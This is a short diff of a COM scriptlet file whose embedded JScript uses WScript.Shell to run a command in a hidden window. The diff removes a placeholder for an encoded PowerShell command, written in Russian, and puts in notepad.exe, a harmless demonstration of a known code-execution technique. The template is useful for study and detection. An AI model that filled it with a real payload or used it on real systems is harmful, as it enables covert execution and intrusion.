@@ -5,7 +5,7 @@
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
     <script language="JScript">
         <![CDATA[
-           var r = new ActiveXObject("WScript.Shell").Run("наша powershell base64 команда",0);
+           var r = new ActiveXObject("WScript.Shell").Run("notepad.exe",0);
        ]]>
 </script>
 </registration>
